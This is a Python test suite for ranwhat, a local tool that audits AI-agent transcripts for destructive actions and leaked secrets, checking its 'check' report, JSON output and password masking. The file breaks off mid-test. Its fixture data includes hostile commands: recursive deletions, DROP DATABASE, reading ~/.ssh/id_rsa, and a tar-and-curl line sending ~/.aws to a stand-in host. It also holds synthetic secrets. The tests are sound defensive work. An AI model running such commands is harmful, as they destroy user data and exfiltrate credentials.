"""`check` prints one report, not two reports and a tail glued together.

It used to print watch's full report, then clean's, then its own tail: three
"Read locally" footers, "Run with --apply" beside a tail saying to run
`clean`, a row of 46 spaces left on the terminal by the progress line, and a
TypeError instead of JSON whenever a secret was found. The fix gates the
footer and advice blocks with keyword arguments. Nothing is filtered out of
rendered text, so most of this file pins that every finding still prints.

Every value here is synthetic, or already used elsewhere in this suite.
"""
import contextlib
import io
import json
import os
import re
import shlex
import sqlite3
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import isolated_home  # noqa: E402,F401  ranwhat's state, never ~/.ranwhat
from ranwhat import clean, cli, term, watch

try:
    import pty
except ImportError:         # Windows: tty needs termios, which it lacks
    pty = None

# The pinned output shows transcript times in the reader's zone. Only
# time.tzset can pin it to UTC, and Windows has none, so there the exact
# output holds only on a machine that is already on UTC, as CI's is.
PINNED_ZONE = unittest.skipUnless(
    hasattr(time, "tzset") or (time.timezone == 0 and not time.daylight),
    "needs time.tzset or a machine on UTC")

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FOOTER = "  Read locally. Nothing was transmitted."
STRIPE = "STRIPE=sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc"     # tests/test_clean.py
DB_PASSWORD = "DB_PASSWORD=kzN8fJx2mQ4vB7nR5tY9wL3pZ6aS1dF0c2e="  # tests/test_clean.py
WIDTH = "60"
RULE = "  " + "-" * 56          # term.rule("-") at RANWHAT_WIDTH=60
# Yesterday, in UTC. check windows each action by its own time (--days 30),
# so a fixed date here would drop out of every report a month later.
DAY = time.strftime("%Y-%m-%d", time.gmtime(time.time() - 86400))


def tool_use(cmd, i, day=DAY):
    return {"timestamp": day + "T10:%02d:00Z" % i,
            "message": {"role": "assistant", "content": [
                {"type": "tool_use", "id": "t%d" % i, "name": "Bash",
                 "input": {"command": cmd}}]}}


def tool_result(text, i, day=DAY):
    return {"timestamp": day + "T10:%02d:30Z" % i,
            "message": {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "t%d" % i,
                 "content": text}]}}


def make_root(rows, age_days=0):
    root = tempfile.mkdtemp(prefix="check-t-")
    proj = os.path.join(root, "-tmp-synthetic-proj")
    os.makedirs(proj)
    path = os.path.join(proj, "s1.jsonl")
    with open(path, "w", encoding="utf-8") as fh:
        for r in rows:
            fh.write(json.dumps(r) + "\n")
    if age_days:
        then = time.time() - age_days * 86400
        os.utime(path, (then, then))
    return root, tempfile.mkdtemp(prefix="check-oc-")


def make_openclaw(command, epoch):
    """An OpenClaw state dir holding one tool call, as watch reads it."""
    state = tempfile.mkdtemp(prefix="check-oc-")
    path = os.path.join(state, "agents", "a1", "agent", "openclaw-agent.sqlite")
    os.makedirs(os.path.dirname(path))
    conn = sqlite3.connect(path)
    conn.execute('CREATE TABLE log (id TEXT, body TEXT, "createdAt" INTEGER)')
    body = json.dumps({"content": [{"type": "tool_use", "name": "bash",
                                    "input": {"command": command}}]})
    conn.execute("INSERT INTO log VALUES (?, ?, ?)", ("1", body, epoch))
    conn.commit()
    conn.close()
    return state


def steps_in(out, cmd):
    """Each command check's tail suggests, as the reader would paste it:
    one line each, with any reason beside it cut off."""
    tail = out.split("  What to do with this", 1)[1]
    return [re.split(r"\s{2,}", line.strip())[0] for line in tail.split("\n")
            if line.startswith("    %s " % cmd)]


# Outside double quotes, a character cmd or PowerShell hands to the
# program as it is: anything else may be acted on by one of them.
_WINDOWS_PLAIN = re.compile(r"[\w.:\\/~+=-]")
# Inside them, what each still expands: % in cmd, $ and ` in PowerShell,
# which also ends a string at a typographic quote.
_WINDOWS_EXPANDED = set("%$`\u201c\u201d\u201e\u2018\u2019\u201a\u201b")


def windows_words(line):
    """The words a program is given for `line` pasted into cmd or into
    PowerShell. Both hand on a word of plain characters, or one in double
    quotes, as it is, and a backslash is itself, as the C runtime that
    splits the program's command line reads it. A line is printed for
    either shell, so what either could read otherwise fails the test: a
    character one of them acts on, and backslashes before a quote, which
    the runtime reads as escapes after cmd and as themselves after
    PowerShell."""
    words, word, quoted, started = [], [], False, False
    for i, c in enumerate(line):
        if c == "\\" and line[i:].lstrip("\\")[:1] == '"':
            raise AssertionError("cmd and PowerShell read backslashes before "
                                 "a quote differently: %r" % line)
        if c == '"':
            quoted, started = not quoted, True
        elif quoted:
            if c in _WINDOWS_EXPANDED:
                raise AssertionError("%r is expanded inside quotes: %r" % (c, line))
            word.append(c)
        elif c in " \t":
            if word or started:
                words.append("".join(word))
            word, started = [], False
        elif _WINDOWS_PLAIN.match(c):
            word.append(c)
        else:
            raise AssertionError("%r is not quoted for cmd and PowerShell: %r"
                                 % (c, line))
    if quoted:
        raise AssertionError("a quote is left open: %r" % line)
    if word or started:
        words.append("".join(word))
    return words


def shell_words(line, windows=os.name == "nt"):
    """A suggested command, read as the shell it is printed for reads it:
    POSIX shlex dropped every backslash of C:\\Users\\..."""
    return windows_words(line) if windows else shlex.split(line)


ACTION = [tool_use("rm -rf ~/Documents/archive", 1)]
SECRET = [tool_result(STRIPE + "\n", 2)]


def _refuse_apply(real):
    def scan(*a, **k):
        if k.get("apply") or (len(a) > 2 and a[2]):
            raise AssertionError("check must never mask")
        return real(*a, **k)
    return scan


class _Base(unittest.TestCase):

    def setUp(self):
        # watch prints transcript times in the reader's zone, so the zone is
        # pinned for the exact output pinned below.
        # The defaults point at empty places, so a command that drops
        # --root or --state-dir reads nothing rather than the real history.
        self.nowhere = tempfile.mkdtemp(prefix="check-default-")
        env = mock.patch.dict(os.environ, {
            "RANWHAT_WIDTH": WIDTH, "TZ": "UTC",
            "CLAUDE_CONFIG_DIR": self.nowhere,
            "OPENCLAW_STATE_DIR": os.path.join(self.nowhere, "openclaw")})
        env.start()
        if hasattr(time, "tzset"):
            self.addCleanup(time.tzset)       # last, once TZ is restored
            time.tzset()
        self.addCleanup(env.stop)
        os.environ.pop("NO_COLOR", None)
        default = mock.patch.object(watch, "CLAUDE_PROJECTS",
                                    os.path.join(self.nowhere, "projects"))
        default.start()
        self.addCleanup(default.stop)
        guard = mock.patch.object(clean, "scan", _refuse_apply(clean.scan))
        guard.start()
        self.addCleanup(guard.stop)

    def run_cli(self, argv, stderr=None):
        out = io.StringIO()
        err = io.StringIO() if stderr is None else stderr
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            try:
                rc = cli.main(argv)
            except SystemExit as e:
                rc = e.code
        return rc, out.getvalue(), (err.getvalue() if stderr is None else "")

    def check(self, rows, *extra, **kw):
        root, st = make_root(rows)
        return self.run_cli(["check", "--root", root, "--state-dir", st]
                            + list(extra), **kw)

    def lines(self, text):
        return text.split("\n")


class OneFooter(_Base):

    def test_every_combination_has_one_footer_and_three_rules(self):
        for rows in (ACTION + SECRET, ACTION, SECRET, [tool_use("ls", 1)]):
            rc, out, _ = self.check(rows)
            self.assertEqual(rc, 0)
            lines = self.lines(out)
            # Exact tool-authored lines, not substrings: evidence may quote them.
            self.assertEqual(lines.count(FOOTER), 1, out)
            self.assertEqual(lines.count(RULE), 3, out)
            self.assertEqual(lines[-4:], [RULE, FOOTER, "", ""], out)
            self.assertEqual(lines.count("  What to do with this"), 1)
            self.assertNotIn("  Dry run. Nothing was changed.", lines)
            self.assertFalse(any("Run with --apply" in l for l in lines))
            self.assertNotIn("\n\n\n", out)

    def test_read_only_is_said_once(self):
        for rows in (ACTION + SECRET, [tool_use("ls", 1)]):
            _, out, _ = self.check(rows)
            self.assertEqual(
                self.lines(out).count("  Nothing was changed. check only reads."), 1)

    def test_clean_step_appears_once_and_only_with_findings(self):
        _, out, _ = self.check(ACTION + SECRET)
        # Whitespace folded: on a narrow terminal the reason sits on the line
        # under its command instead of beside it, after the run's --root.
        tail = " ".join(out.split("  What to do with this", 1)[1].split())
        steps = re.findall(r" clean(?: \S+)*? review each secret, then mask it",
                           tail)
        self.assertEqual(len(steps), 1, out)
        _, out, _ = self.check(ACTION)
        self.assertNotIn("review each secret", out)

    def test_sections_are_separated_by_one_blank_line(self):
        _, out, _ = self.check(ACTION + SECRET)
        self.assertTrue(out.startswith("\n  ranwhat watch"), out[:40])
        i = out.index("  ranwhat clean")
        self.assertEqual(out[i - 2:i], "\n\n")
        self.assertNotEqual(out[i - 3], "\n")


class NothingIsLost(_Base):

    def test_deletion_and_evidence(self):
        _, out, _ = self.check(ACTION)
        self.assertIn("Bulk or recursive deletion", out)
        self.assertIn("      rm -rf ~/Documents/archive", self.lines(out))

    def test_force_push(self):
        _, out, _ = self.check([tool_use("git push --force origin main", 1)])
        self.assertIn("Destructive git operation", out)

    def test_stripe_key_with_rotation_warning(self):
        # The diagnosis used sk_live_51HxAbCdEf..., which the fixture filter
        # now treats as a typed alphabet; this Stripe-shaped value is real.
        _, out, _ = self.check(SECRET)
        self.assertIn("Stripe live secret key", out)
        self.assertIn("sk_…dc", out)
        self.assertIn("  These must be rotated.", self.lines(out))

    def test_env_password_keeps_its_origin(self):
        rows = [tool_use("cat api/.env", 1), tool_result(DB_PASSWORD + "\n", 1)]
        _, out, _ = self.check(rows)
        self.assertIn("* DB_PASSWORD", out)
        self.assertIn("read from api/.env", out)

    def test_database_url_and_aws_key(self):
        rows = [tool_result(
            "DATABASE_URL=postgresql://admin:sup3rS3cretPw@db:5432/a\n", 1)]
        rc, out, _ = self.check(rows, "--json")
        self.assertEqual(rc, 0)
        self.assertEqual(len(json.loads(out)["secrets"]), 1)
        _, out, _ = self.check([tool_result("AWS=AKIA" "IOSFODNN7REALKEY\n", 1)])
        self.assertIn("AWS access key ID", out)

    def test_bullets_equal_json_counts(self):
        rows = ACTION + SECRET + [
            tool_use("git push --force origin main", 3),
            tool_use("cat api/.env", 4), tool_result(DB_PASSWORD + "\n", 4)]
        root, st = make_root(rows)
        args = ["--root", root, "--state-dir", st]
        _, text, _ = self.run_cli(["check"] + args)
        _, actions, _ = self.run_cli(["watch", "--json"] + args)
        _, found, _ = self.run_cli(["clean", "--json", "--no-interactive"] + args)
        expected = len(json.loads(actions)) + len(json.loads(found)["findings"])
        self.assertGreaterEqual(expected, 4)
        bullets = [l for l in self.lines(text) if l.startswith("  * ")]
        self.assertEqual(len(bullets), expected, text)

    # Evidence is cut to the terminal, so these run wide enough to show it.
    def test_evidence_quoting_the_footer_survives(self):
        cmd = 'rm -rf ~/Documents/"  Read locally. Nothing was transmitted."'
        with mock.patch.dict(os.environ, {"RANWHAT_WIDTH": "96"}):
            _, out, _ = self.check([tool_use(cmd, 1)])
        self.assertIn("Bulk or recursive deletion", out)
        self.assertIn("      " + cmd, self.lines(out))
        self.assertEqual(self.lines(out).count(FOOTER), 1)

    def test_evidence_quoting_the_advice_survives(self):
        cmd = 'rm -rf ~/Documents/"Dry run. Nothing was changed. Run with --apply"'
        with mock.patch.dict(os.environ, {"RANWHAT_WIDTH": "96"}):
            _, out, _ = self.check([tool_use(cmd, 1)])
        self.assertIn("Bulk or recursive deletion", out)
        self.assertIn("      " + cmd, self.lines(out))


class Json(_Base):

    def test_check_json_with_a_secret(self):
        rows = ACTION + [tool_use("cat api/.env", 2),
                         tool_result(DB_PASSWORD + "\n", 2)]
        root, st = make_root(rows)
        rc, out, err = self.run_cli(["check", "--json", "--root", root,
                                     "--state-dir", st])
        self.assertEqual(rc, 0)
        doc = json.loads(out)
        self.assertEqual(len(doc["secrets"]), 1)
        s = doc["secrets"][0]
        for k in ("files", "origins", "projects"):
            self.assertIsInstance(s[k], list)
        self.assertEqual(s["origins"], ["api/.env"])
        self.assertTrue(s["fingerprint"] and s["hint"])
        _, actions, _ = self.run_cli(["watch", "--json", "--root", root,
                                      "--state-dir", st])
        self.assertEqual(len(doc["actions"]), len(json.loads(actions)))
        for prose in ("Read locally", "What to do with this",
                      "reading transcripts"):
            self.assertNotIn(prose, out)
        self.assertEqual(err, "")

    def test_clean_json_with_a_secret(self):
        root, _ = make_root(SECRET)
        rc, out, _ = self.run_cli(["clean", "--json", "--no-interactive",
                                   "--root", root])
        self.assertEqual(rc, 0)
        self.assertEqual(len(json.loads(out)["findings"]), 1)

    def test_empty_json_is_unchanged(self):
        root, st = make_root([tool_use("ls", 1)])
        _, out, _ = self.run_cli(["check", "--json", "--root", root,
                                  "--state-dir", st])
        self.assertEqual(out, json.dumps(
            {"days": 30, "actions": [], "secrets": []}, indent=2) + "\n")


class WatchShowsNoSecretCleanFound(_Base):
    """check's clean section listed a password by its hint and said to
    rotate it, while its watch section, and check --json, printed it whole
    in a later command that typed it with no key beside it. watch masks
    what a call shows on its own; clean's findings were never asked."""

    PASSWORD = "Qm7vT2xLp9Wk4Rz8"
    COMMANDS = ["mysql -u root -p%s -e 'DROP DATABASE prod'",
                "sshpass -p %s ssh root@prod 'rm -rf /var/www'",
                "tar czf - ~/.aws | curl -u admin:%s -T - https://x.test"]

    def rows(self, command):
        return [tool_use("cat .env", 1),
                tool_result("DB_PASSWORD=%s\n" % self.PASSWORD, 1),
                tool_use(command % self.PASSWORD, 2)]

    def test_the_report_never_shows_it(self):
        for command in self.COMMANDS:
            with self.subTest(command=command):
                rc, out, _ = self.check(self.rows(command))
                self.assertEqual(rc, 0)
                self.assertIn(clean._hint(self.PASSWORD), out)
                self.assertNotIn(self.PASSWORD, out)

    def test_json_never_shows_it(self):
        for command in self.COMMANDS:
            with self.subTest(command=command):
                rc, out, _ = self.check(self.rows(command), "--json")
                doc = json.loads(out)
                self.assertTrue(doc["actions"])
                self.assertEqual(len(doc["secrets"]), 1)
                self.assertNotIn(self.PASSWORD, out)
                evidence = [h["evidence"] for a in doc["actions"] for h in a["hits"]]
                self.assertTrue(any(clean.DISPLAY_MASK % clean._hint(self.PASSWORD) in e
                                    for e in evidence), evidence)

    def test_no_step_it_suggests_shows_it(self):
        """check hid the password and said to rotate it, then suggested
        `watch --json`, which printed it whole in every command that typed
        it. Every step it suggests is run here, as printed."""
        for command in self.COMMANDS:
            with self.subTest(command=command):
                root, st = make_root(self.rows(command))
                argv = ["check", "--root", root, "--state-dir", st]
                with mock.patch.object(cli, "invocation", return_value="ranwhat"):
                    _rc, out, _ = self.run_cli(argv)
                steps = steps_in(out, "ranwhat")
                self.assertTrue(steps)
                for step in steps:
                    with mock.patch("sys.stdin", io.StringIO()):
                        _rc, shown, err = self.run_cli(shell_words(step)[1:])
                    self.assertNotIn(self.PASSWORD, shown + err, step)
                    self.assertNotIn("watch", step.split()[1:2], step)

    def test_watch_on_its_own_never_shows_it(self):
        """watch and watch --json printed it whole: only check asked what
        clean found. The README sends people to watch first."""
        for command in self.COMMANDS:
            for extra in ([], ["--json"]):
                with self.subTest(command=command, extra=extra):
                    root, st = make_root(self.rows(command))
                    rc, out, err = self.run_cli(["watch", "--root", root,
                                                 "--state-dir", st] + extra)
                    self.assertEqual(rc, 0)
                    self.assertNotIn(self.PASSWORD, out + err)
                    shown = (" ".join(h["evidence"] for a in json.loads(out)
                                      for h in a["hits"]) if extra else out)
                    self.assertIn(clean.DISPLAY_MASK % clean._hint(self.PASSWORD), shown)

    # Where no rule reads a password: only what clean found elsewhere says
    # it is one.
    UNTYPED = ["sqlcmd -S db -U sa -P %s -Q 'DROP DATABASE prod'",
               "influx -username admin -password %s -execute 'DROP DATABASE prod'"]

    def test_watch_masks_it_without_a_clean_pass(self):
        """watch ran all of clean over every transcript whenever it found an
        action, to mask its evidence, and was two to four times slower
        than main. It looks only for what its evidence shows."""
        for command in self.UNTYPED:
            for extra in ([], ["--json"]):
                with self.subTest(command=command, extra=extra):
                    root, st = make_root(self.rows(command))
                    with mock.patch.object(clean, "scan", side_effect=AssertionError(
                            "watch ran a whole clean pass")):
                        rc, out, err = self.run_cli(["watch", "--root", root,
                                                     "--state-dir", st] + extra)
                    self.assertEqual(rc, 0, err)
                    self.assertNotIn(self.PASSWORD, out + err)
                    shown = (" ".join(h["evidence"] for a in json.loads(out)
                                      for h in a["hits"]) if extra else out)
                    self.assertIn("DROP DATABASE", shown)
                    self.assertIn(clean.DISPLAY_MASK % clean._hint(self.PASSWORD), shown)

    def test_an_accented_password_however_json_writes_it(self):
        """A transcript is searched as the bytes JSON writes, escaped or not."""
        password = "Qm7v\u00e9T2xLp9Wk4Rz8"
        for ascii_only in (True, False):
            with self.subTest(ascii_only=ascii_only):
                root, st = make_root([tool_use("cat .env", 1)])
                path = os.path.join(root, os.listdir(root)[0], "s9.jsonl")
                with open(path, "w", encoding="utf-8") as fh:
                    fh.write(json.dumps(tool_result("DB_PASSWORD=%s\n" % password, 1),
                                        ensure_ascii=ascii_only) + "\n")
                    fh.write(json.dumps(tool_use(self.UNTYPED[0] % password, 2),
                                        ensure_ascii=ascii_only) + "\n")
                rc, out, err = self.run_cli(["watch", "--root", root, "--state-dir", st])
                self.assertEqual(rc, 0, err)
                self.assertIn("DROP DATABASE", out)
                self.assertNotIn(password, out)

    def test_untyped_in_another_session_and_cut_by_the_window(self):
        password = "Xk9mPq" "2vRt7wLz4bN8cQ5dHs3fJy6gTu1aEe0iWo"
        root, st = make_root([tool_use("cat .env", 1),
                              tool_result("DB_PASSWORD=%s\n" % password, 1)])
        other = os.path.join(root, "-tmp-other-proj")
        os.makedirs(other)
        with open(os.path.join(other, "s2.jsonl"), "w", encoding="utf-8") as fh:
            fh.write(json.dumps(tool_use(
                "influx -username admin -password %s -execute 'DROP DATABASE prod'"
                % password, 3)) + "\n")
        for argv in (["watch"], ["watch", "--json"], ["check"], ["check", "--json"]):
            with self.subTest(argv=argv):
                rc, out, err = self.run_cli(argv + ["--root", root, "--state-dir", st])
                self.assertEqual(rc, 0)
                self.assertIn("DROP DATABASE", out)
                for i in range(len(password) - 3):
                    self.assertNotIn(password[i:i + 4], out + err)

    def test_a_password_read_in_another_session(self):
        """The value may have been read in one session and typed in another."""
        root, st = make_root(self.rows(self.COMMANDS[0])[:2])
        other = os.path.join(root, "-tmp-other-proj")
        os.makedirs(other)
        with open(os.path.join(other, "s2.jsonl"), "w", encoding="utf-8") as fh:
            fh.write(json.dumps(tool_use(self.COMMANDS[0] % self.PASSWORD, 3)) + "\n")
        for argv in (["watch"], ["watch", "--json"], ["check"], ["check", "--json"]):
            with self.subTest(argv=argv):
                rc, out, err = self.run_cli(argv + ["--root", root, "--state-dir", st])
                self.assertEqual(rc, 0)
                self.assertNotIn(self.PASSWORD, out + err)

    def test_nor_the_part_a_window_shows(self):
        """Evidence is a window onto the command, and its edge can fall
        inside a long password: what shows of it is masked too."""
        password = "Xk9mPq" "2vRt7wLz4bN8cQ5dHs3fJy6gTu1aEe0iWo"
        rows = [tool_use("cat .env", 1),
                tool_result("DB_PASSWORD=%s\n" % password, 1),
                tool_use("sshpass -p %s ssh h 'rm -rf /srv/x'" % password, 2)]
        _rc, out, _ = self.check(rows, "--json")
        evidence = [h["evidence"] for a in json.loads(out)["actions"] for h in a["hits"]
                    if h["rule"] == "fs.destructive"]
        self.assertEqual(len(evidence), 1)
        self.assertTrue(evidence[0].startswith("…<"), evidence)
        for i in range(len(password) - 3):
            self.assertNotIn(password[i:i + 4], evidence[0])


class SubagentTranscripts(_Base):
    """Claude Code writes what a subagent ran and saw to a transcript of its
    own, under <session>/subagents/, a workflow's under workflows/<run>/.
    Only <project>/*.jsonl was read, so check said all clear over all of
    it: on a working machine, 302 such files held 5,853 of 7,037 Bash
    calls. A workflow's journal.jsonl beside them is not a transcript."""

    KEY = "STRIPE_SECRET_KEY=sk_" "live_" + "8vQ2mT5xR9kL3nP7wZ4yB6cD"

    def make(self):
        root, st = make_root([tool_use("ls", 1)])
        session = os.path.join(root, "-tmp-synthetic-proj", "s1")
        agents = [
            (os.path.join(session, "subagents"),
             [tool_use("cat ~/.ssh/id_rsa", 2), tool_use("cat api/.env", 3),
              tool_result(self.KEY + "\n", 3)]),
            (os.path.join(session, "subagents", "workflows", "wf_1"),
             [tool_use("rm -rf ~/Documents", 4)]),
        ]
        for folder, rows in agents:
            os.makedirs(folder)
            with open(os.path.join(folder, "agent-a1.jsonl"), "w",
                      encoding="utf-8") as fh:
                fh.write("".join(json.dumps(r) + "\n" for r in rows))
        with open(os.path.join(agents[1][0], "journal.jsonl"), "w",
                  encoding="utf-8") as fh:
            fh.write(json.dumps({"type": "result", "result": DB_PASSWORD}) + "\n")
        return root, st

    def test_check_reads_what_subagents_ran_and_saw(self):
        root, st = self.make()
        rc, out, _ = self.run_cli(["check", "--json", "--root", root,
                                   "--state-dir", st])
        self.assertEqual(rc, 0)
        doc = json.loads(out)
        self.assertEqual(sorted(a["hits"][0]["rule"] for a in doc["actions"]),
                         ["cred.read", "cred.read", "fs.destructive"])
        self.assertEqual(len(doc["secrets"]), 1)      # not the journal's
        secret = doc["secrets"][0]
        self.assertEqual(secret["origins"], ["api/.env"])
        self.assertEqual(secret["projects"],
                         [clean.project_path("-tmp-synthetic-proj")])

    def test_each_is_credited_to_its_session(self):
        root, _ = self.make()
        self.assertEqual(len(watch.discover(root)), 3)
        records, scanned = watch.scan_all(root)
        self.assertEqual(scanned, 3)
        self.assertEqual({(r["project"], r["session"]) for r in records},
                         {("-tmp-synthetic-proj", "s1")})


class Arguments(_Base):

    def test_days_below_one_is_an_error_not_an_all_clear(self):
        for days in ("0", "-1"):
            rc, out, err = self.check(ACTION + SECRET, "--days", days)
            self.assertEqual(rc, 2)
            self.assertIn("--days must be at least 1", err)
            self.assertNotIn("Nothing flagged", out)

    def test_apply_is_refused_before_anything_is_scanned(self):
        called = []
        with mock.patch.object(clean, "scan",
                               lambda *a, **k: called.append(k) or ({}, 0, [])):
            rc, out, err = self.check(SECRET, "--apply")
        self.assertEqual(rc, 2)
        self.assertEqual(called, [])
        self.assertIn("check never changes anything", err)
        self.assertEqual(out, "")


class APathIsNotARoot(_Base):
    """`check DIR` read the default history and said so as if it were DIR,
    and `clean DIR --apply` would have masked the default history. A path
    is taken by scan alone; anywhere else it is refused, and the error says
    to pass --root. On Python 3.9 a flag before scan's path refused it."""

    def test_check_watch_and_clean_refuse_a_path(self):
        root, st = make_root(ACTION + SECRET)
        with mock.patch.object(watch, "CLAUDE_PROJECTS", root), \
             mock.patch.dict(os.environ, {"OPENCLAW_STATE_DIR": st}):
            for argv in (["check", self.nowhere], ["watch", self.nowhere],
                         ["clean", self.nowhere, "--no-interactive"],
                         ["clean", self.nowhere, "--apply"],
                         ["check", "--json", self.nowhere]):
                with self.subTest(argv=argv), \
                     mock.patch.object(clean, "scan", side_effect=AssertionError):
                    rc, out, err = self.run_cli(argv)
                    self.assertEqual((rc, out), (2, ""))
                    said = " ".join(err.split())
                    self.assertIn("%s takes no path" % argv[0], said)
                    # Nothing there is a transcript, so --root there reads
                    # nothing: the error says so, and where they are.
                    self.assertNotIn("--root", said.split("error:")[-1])
                    self.assertIn("No Claude Code transcripts are in or near %s"
                                  % self.nowhere, said)
                    self.assertIn("Run %s with no path to read the ones in %s"
                                  % (argv[0], cli._shell_path(root)), said)

    def test_a_config_directory_is_refused_with_its_projects(self):
        """`check ~/.claude` is the likeliest path to give, and --root
        ~/.claude would read nothing either."""
        projects, _st = make_root(ACTION)
        config = tempfile.mkdtemp(prefix="check-config-")
        os.rename(projects, os.path.join(config, "projects"))
        rc, out, err = self.run_cli(["check", config])
        self.assertEqual((rc, out), (2, ""))
        self.assertIn("--root %s" % os.path.join(config, "projects"),
                      " ".join(err.split()))

    def test_the_root_it_suggests_reads_the_path(self):
        """For a project's directory, a transcript or the home directory,
        it said to pass that path as --root, which reads <root>/*/*.jsonl:
        followed, it read nothing and said "No transcripts found"."""
        home = tempfile.mkdtemp(prefix="check-home-")
        projects = os.path.join(home, ".claude", "projects")
        project = os.path.join(projects, "-Users-alice-app")
        agents = os.path.join(project, "s1", "subagents")
        os.makedirs(agents)
        for path in (os.path.join(project, "s1.jsonl"),
                     os.path.join(agents, "agent-a1.jsonl")):
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(json.dumps(tool_use("rm -rf ~/Documents", 1)) + "\n")
        st = tempfile.mkdtemp(prefix="check-oc-")
        for given in (project, os.path.join(project, "s1.jsonl"),
                      os.path.join(project, "s1"), os.path.join(agents, "agent-a1.jsonl"),
                      home, os.path.join(home, ".claude"), projects):
            for command in ("check", "watch", "clean"):
                with self.subTest(given=given, command=command):
                    rc, out, err = self.run_cli([command, given])
                    self.assertEqual((rc, out), (2, ""))
                    said = " ".join(err.split())
                    self.assertEqual(re.findall(r"--root (\S+)", said.split("error:")[-1]),
                                     [projects])
                    rc, out, err = self.run_cli([command, "--root", projects,
                                                 "--state-dir", st, "--no-interactive"]
                                                if command == "clean" else
                                                [command, "--root", projects, "--state-dir", st])
                    self.assertEqual(rc, 0, err)
                    self.assertIn("Read Claude Code: 2 transcripts", out)

    def test_a_path_with_no_transcripts_near_it_suggests_no_root(self):
        """`check ~/Desktop/app`, a project's source, said to pass --root
        ~/Desktop/app, and so did a path that does not exist and an empty
        project directory: followed, each read 0 transcripts and exited 2.
        It says plainly that nothing there is a transcript, and names the
        projects directory a run with no path reads, which works."""
        source = tempfile.mkdtemp(prefix="check-src-")
        with open(os.path.join(source, "app.py"), "w", encoding="utf-8") as fh:
            fh.write("print('hi')\n")
        projects = tempfile.mkdtemp(prefix="check-projects-")
        empty = os.path.join(projects, "-Users-alice-empty")
        os.makedirs(empty)
        full = os.path.join(projects, "-Users-alice-app")
        os.makedirs(full)
        with open(os.path.join(full, "s1.jsonl"), "w", encoding="utf-8") as fh:
            fh.write(json.dumps(tool_use("rm -rf ~/Documents", 1)) + "\n")
        notes = os.path.join(source, "notes.txt")
        with open(notes, "w", encoding="utf-8") as fh:
            fh.write("x\n")
        missing = os.path.join(source, "no-such-dir")
        st = tempfile.mkdtemp(prefix="check-oc-")
        for given in (source, empty, notes, missing):
            for command in ("check", "watch", "clean"):
                with self.subTest(given=given, command=command), \
                     mock.patch.object(watch, "CLAUDE_PROJECTS", projects):
                    rc, out, err = self.run_cli([command, given])
                    self.assertEqual((rc, out), (2, ""))
                    said = " ".join(err.split()).split("error:")[-1]
                    self.assertNotIn("--root", said)
                    self.assertIn(given, said)
                    self.assertIn("Run %s with no path to read the ones in %s"
                                  % (command, cli._shell_path(projects)), said)
                    # The step it names reads them.
                    rc, out, err = self.run_cli(
                        [command, "--state-dir", st]
                        + (["--no-interactive"] if command == "clean" else []))
                    self.assertEqual(rc, 0, err)
                    self.assertIn("Read Claude Code: 1 transcript", out)
        # With none in the projects directory either, no step is offered.
        nothing = tempfile.mkdtemp(prefix="check-none-")
        with mock.patch.object(watch, "CLAUDE_PROJECTS", nothing):
            rc, out, err = self.run_cli(["check", source])
        said = " ".join(err.split()).split("error:")[-1]
        self.assertEqual((rc, out), (2, ""))
        self.assertNotIn("--root", said)
        self.assertNotIn("Run check", said)
        self.assertIn("No Claude Code transcripts are in or near %s, nor in %s"
                      % (source, cli._shell_path(nothing)), said)

    def test_the_others_refuse_one_too(self):
        for argv in (["demo", "extra-arg"], ["update", "--status", "x"],
                     ["live", "x"]):
            with self.subTest(argv=argv):
                rc, out, err = self.run_cli(argv)
                self.assertEqual((rc, out), (2, ""))
                self.assertIn("%s takes no path" % argv[0], " ".join(err.split()))

    def test_scan_takes_its_path_after_a_flag(self):
        path = os.path.join(REPO, "ranwhat", "demo", "support-copilot.json")
        for argv in (["scan", "--json", path], ["--json", "scan", path],
                     ["scan", path, "--json"]):
            with self.subTest(argv=argv):
                rc, out, err = self.run_cli(argv)
                self.assertEqual(rc, 0, err)
                self.assertIn("scores", json.loads(out))

    def test_flags_still_go_anywhere(self):
        root, st = make_root(ACTION)
        rc, out, _ = self.run_cli(["--json", "check", "--root", root,
                                   "--state-dir", st])
        self.assertEqual(rc, 0)
        self.assertEqual(len(json.loads(out)["actions"]), 1)


class NothingToRead(_Base):
    """A mistyped --root, a fresh machine, or history kept somewhere else
    read no transcript at all, and check printed "Nothing flagged" and "No
    secrets found" and exited 0; `watch --json` printed [], which a script
    could not tell from a clean result. Nothing read is now said as such,
    with where it looked, and exits 2."""

    ROOT = "/nonexistent/ranwhat-root"
    NOWHERE = ["--root", ROOT, "--state-dir", "/nonexistent/ranwhat-state"]
    CLEAR = ("Nothing flagged", "Every call was read", "No secrets found")

    def assertNotAllClear(self, text):
        for line in self.CLEAR:
            self.assertNotIn(line, text)

    def test_check_says_where_it_looked_and_exits_2(self):
        rc, out, err = self.run_cli(["check"] + self.NOWHERE)
        self.assertEqual(rc, 2)
        self.assertNotAllClear(out)
        self.assertIn("No transcripts found", out)
        self.assertIn(self.ROOT, out)
        self.assertIn("--root", out)
        self.assertEqual(self.lines(out).count(FOOTER), 1)
        self.assertEqual(err, "")

    def test_check_says_it_under_its_own_name(self):
        """With nothing read, watch's section is all check prints above its
        tail, and it opened with watch's header ("ranwhat watch · local
        agent flight recorder") in a report check printed."""
        old = time.strftime("%Y-%m-%d", time.gmtime(time.time() - 60 * 86400))
        root, st = make_root([tool_use("ls", 1, old)], age_days=60)
        for argv in (["check"] + self.NOWHERE,
                     ["check", "--root", root, "--state-dir", st]):
            for width in ("46", "60", "80"):
                with mock.patch.dict(os.environ, {"RANWHAT_WIDTH": width}):
                    with self.subTest(argv=argv[:2], width=width):
                        rc, out, _ = self.run_cli(argv)
                        self.assertEqual(rc, 2)
                        self.assertTrue(out.startswith(
                            "\n  ranwhat check  · watch and clean in "
                            "one pass\n"), out[:80])
                        self.assertNotIn("ranwhat watch", out)
                        self.assertNotIn("flight recorder", out)
                        self.assertNotIn("ranwhat clean", out)
                        self.assertEqual(self.lines(out).count(FOOTER), 1)
        # watch's own report keeps its own
        rc, out, _ = self.run_cli(["watch"] + self.NOWHERE)
        self.assertTrue(out.startswith("\n  ranwhat watch  · local agent "
